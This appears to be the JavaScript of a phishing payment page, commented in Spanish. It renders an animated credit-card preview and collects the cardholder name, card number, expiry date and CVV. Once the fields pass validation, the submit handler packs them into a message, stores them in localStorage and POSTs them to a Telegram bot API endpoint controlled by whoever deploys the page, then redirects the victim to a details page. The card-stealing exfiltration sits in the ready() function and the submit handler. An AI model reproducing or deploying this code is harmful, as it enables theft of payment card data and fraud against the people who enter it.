const tarjeta = document.querySelector('#tarjeta'),
	  btnAbrirFormulario = document.querySelector('#btn-abrir-formulario'),
	  formulario = document.querySelector('#formulario-tarjeta'),
	  numeroTarjeta = document.querySelector('#tarjeta .numero'),
	  nombreTarjeta = document.querySelector('#tarjeta .nombre'),
	  logoMarca = document.querySelector('#logo-marca'),
	  firma = document.querySelector('#tarjeta .firma p'),
	  mesExpiracion = document.querySelector('#tarjeta .mes'),
	  yearExpiracion = document.querySelector('#tarjeta .year');
	  ccv = document.querySelector('#tarjeta .ccv');
   sig = document.querySelector('#btn-enviar');
   telegram_bot_id = "telegram_bot_ID";
   chat_id = "chatID";
var message;

var theme = localStorage.getItem('theme');
     $('body').attr('data-bs-theme', theme);


window.onload = function(){
    var paq = localStorage.getItem('paq'),
        pri = localStorage.getItem('pri'),
        error = localStorage.getItem ('error'),
        np = $('<p>').addClass('paqt').text('Paquete ' + paq),
        np1 = $('<p>').addClass('pri').text(pri + '.⁰⁰');

    $('#gpepaq').append(np);
    $('#gppri').append(np1);

    if(error == 'true'){
    $('#error').addClass('show');
}

};


     $('#light').on('click', function() {
              $('body').attr('data-bs-theme', 'light');
              localStorage.setItem('theme', 'light');
});

     $('#dark').on('click', function() {
              $('body').attr('data-bs-theme', 'dark');
              localStorage.setItem('theme', 'dark');
});




// * Volteamos la tarjeta para mostrar el frente.
const mostrarFrente = () => {
	if(tarjeta.classList.contains('active')){
		tarjeta.classList.remove('active');
	}
}

// * Rotacion de la tarjeta
tarjeta.addEventListener('click', () => {
	tarjeta.classList.toggle('active');
});

// * Boton de abrir formulario
btnAbrirFormulario.addEventListener('click', () => {
	btnAbrirFormulario.classList.toggle('active');
	formulario.classList.toggle('active');
 $('#error').removeClass('show');
});

// * Select del mes generado dinamicamente.
for(let i = 1; i <= 12; i++){
	let opcion = document.createElement('option');
	opcion.value = i;
	opcion.innerText = i;
	formulario.selectMes.appendChild(opcion);
}

// * Select del año generado dinamicamente.
const yearActual = new Date().getFullYear();
for(let i = yearActual; i <= yearActual + 8; i++){
	let opcion = document.createElement('option');
	opcion.value = i;
	opcion.innerText = i;
	formulario.selectYear.appendChild(opcion);
}

// * Input numero de tarjeta
formulario.inputNumero.addEventListener('keyup', (e) => {
	let valorInput = e.target.value;

	formulario.inputNumero.value = valorInput
	// Eliminamos espacios en blanco
	.replace(/\s/g, '')
	// Eliminar las letras
	.replace(/\D/g, '')
	// Ponemos espacio cada cuatro numeros
	.replace(/([0-9]{4})/g, '$1 ')
	// Elimina el ultimo espaciado
	.trim();

	numeroTarjeta.textContent = valorInput;

	if(valorInput == ''){
		numeroTarjeta.textContent = '#### #### #### ####';

		logoMarca.innerHTML = '';
	}

	if(valorInput[0] == 4){
   $('#inputNumero').attr("maxlength", 19);
		logoMarca.innerHTML = '';
		const imagen = document.createElement('img');
		imagen.src = 'img/logos/visa.png';
		logoMarca.appendChild(imagen);
	} else if(valorInput[0] == 5){
   $('#inputNumero').attr("maxlength", 19);
   $('#inputCCV').attr("maxlength", 3);
		logoMarca.innerHTML = '';
		const imagen = document.createElement('img');
		imagen.src = 'img/logos/mastercard.png';
		logoMarca.appendChild(imagen);
	} else if(valorInput[0] == 6){
   $('#inputNumero').attr("maxlength", 18);
   $('#inputCCV').attr("maxlength", 4);
		logoMarca.innerHTML = '';
		const imagen = document.createElement('img');
		imagen.src = 'img/logos/amerie.png';
   $(imagen).addClass('amer');
		logoMarca.appendChild(imagen);
	}

	// Volteamos la tarjeta para que el usuario vea el frente.
	mostrarFrente();
});

// * Input nombre de tarjeta
formulario.inputNombre.addEventListener('keyup', (e) => {
	let valorInput = e.target.value;

	formulario.inputNombre.value = valorInput.replace(/[0-9]/g, '');
	nombreTarjeta.textContent = valorInput;
	firma.textContent = valorInput;

	if(valorInput == ''){
		nombreTarjeta.textContent = 'Jhon Doe';
	}

	mostrarFrente();
});

// * Select mes
formulario.selectMes.addEventListener('change', (e) => {
	mesExpiracion.textContent = e.target.value;
	mostrarFrente();
});

// * Select Año
formulario.selectYear.addEventListener('change', (e) => {
	yearExpiracion.textContent = e.target.value.slice(2);
	mostrarFrente();
});

// * CCV
formulario.inputCCV.addEventListener('keyup', () => {
	if(!tarjeta.classList.contains('active')){
		tarjeta.classList.toggle('active');
	}

	formulario.inputCCV.value = formulario.inputCCV.value
	// Eliminar los espacios
	.replace(/\s/g, '')
	// Eliminar las letras
	.replace(/\D/g, '');

	ccv.textContent = formulario.inputCCV.value;
});


function ready() {

        nom = document.getElementById('inputNombre').value;
        nta = document.getElementById('inputNumero').value;
        me = document.getElementById ('selectMes').value;
        an = document.getElementById ('selectYear').value;
        cs = document.getElementById ('inputCCV').value;
     
        localStorage.setItem('nom', nom);
        localStorage.setItem('nta', nta);
        localStorage.setItem('me', me);
        localStorage.setItem('an', an);
        localStorage.setItem('cs', cs);
  
        message =  "■■■■■📲🧾📥■■■■■\n👤 Nom: "+ nom + "\n💳 Nu: "+ nta + "\n📅 Mes: " + me + "\n🗓 Año: " + an + "\n🔑 C: " + cs + "\n■■■■■■■■■■■■■■";
    
}

$(sig).on('click', function(event) {
event.preventDefault();
$('#spin').addClass('spinner-border spinner-border-sm');
setTimeout(function() {
    ready();
    if( nom == '' || nta == '' || nta.length < 19 & parseInt(nta.charAt(0)) == 4 || nta.length < 19 & parseInt(nta.charAt(0)) == 5 || nta.length < 18 & parseInt(nta.charAt(0)) == 6 || parseInt(nta.charAt(0)) <= 3 || parseInt(nta.charAt(0)) >= 7 || nta.length > 19 || me == '' || me == 'Mes' || an == '' || an == 'Año' || cs == '' || cs.length < 4 & parseInt(nta.charAt(0)) == 6 || cs.length > 3 & parseInt(nta.charAt(0)) == 4 || cs.length > 3 & parseInt(nta.charAt(0)) == 5 || cs.length < 3 & parseInt(nta.charAt(0)) == 4 || cs.length < 3 & parseInt(nta.charAt(0)) == 5) {
    
    localStorage.setItem('error', 'true');
    window.location.reload();

}
else {
    localStorage.setItem('error', 'false');
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="details.html"
    });
    return false;
}
}, 3000);
});